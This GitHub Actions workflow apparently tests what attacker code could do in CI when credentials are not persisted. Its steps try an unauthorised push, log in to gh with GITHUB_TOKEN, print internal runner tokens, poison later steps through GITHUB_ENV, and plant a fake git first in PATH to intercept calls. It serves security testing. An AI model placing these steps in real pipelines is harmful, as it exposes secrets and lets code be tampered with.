name: "Test: RCE paths with persist-credentials false"

on:
  workflow_dispatch:

permissions:
  contents: write
  pull-requests: write

jobs:
  test:
    runs-on: ubuntu-latest
    steps:
    - name: Checkout
      uses: actions/checkout@v5
      with:
        persist-credentials: false

    - name: Simulate autogen.sh (attacker code)
      run: |
        echo "=== 1. Can we git push directly? ==="
        echo "test" >> rce-test.txt
        git add rce-test.txt || true
        git config user.email "attacker@evil.com"
        git config user.name "Attacker"
        git commit -m "attacker commit" || true
        git push origin master 2>&1 || echo "PUSH FAILED (expected with persist-credentials:false)"

        echo ""
        echo "=== 2. Can we use gh CLI? ==="
        gh auth status 2>&1 || echo "GH CLI: not authenticated"

        echo ""
        echo "=== 3. Can we use GITHUB_TOKEN via gh CLI? ==="
        echo "${GITHUB_TOKEN:-NOT_SET}" | gh auth login --with-token 2>&1 || echo "GH CLI login: failed"

        echo ""
        echo "=== 4. ACTIONS_RUNTIME_TOKEN / internal runner tokens ==="
        echo "ACTIONS_RUNTIME_TOKEN: ${ACTIONS_RUNTIME_TOKEN:-NOT_FOUND}"
        echo "ACTIONS_ID_TOKEN_REQUEST_URL: ${ACTIONS_ID_TOKEN_REQUEST_URL:-NOT_FOUND}"
        echo "ACTIONS_ID_TOKEN_REQUEST_TOKEN: ${ACTIONS_ID_TOKEN_REQUEST_TOKEN:-NOT_FOUND}"

        echo ""
        echo "=== 5. Can we write to GITHUB_ENV to poison later steps? ==="
        echo "INJECTED_VAR=pwned_by_attacker" >> $GITHUB_ENV
        echo "Written to GITHUB_ENV"

        echo ""
        echo "=== 6. Can we plant a fake 'git' in PATH to intercept later? ==="
        mkdir -p /tmp/fakebins
        cat > /tmp/fakebins/git << 'FAKEGIT'
        #!/bin/bash
        echo "[FAKE GIT] called with: $@" >> /tmp/git-intercept.log
        /usr/bin/git "$@"
        FAKEGIT
        chmod +x /tmp/fakebins/git
        echo "PATH=/tmp/fakebins:$PATH" >> $GITHUB_ENV
        echo "Planted fake git in PATH via GITHUB_ENV"

    - name: Check GITHUB_ENV injection worked
      run: |
        echo "INJECTED_VAR=$INJECTED_VAR"
        echo "PATH starts with: $(echo $PATH | cut -d: -f1)"
        echo "git location: $(which git)"
        git --version
        cat /tmp/git-intercept.log 2>/dev/null || echo "no intercept log yet"
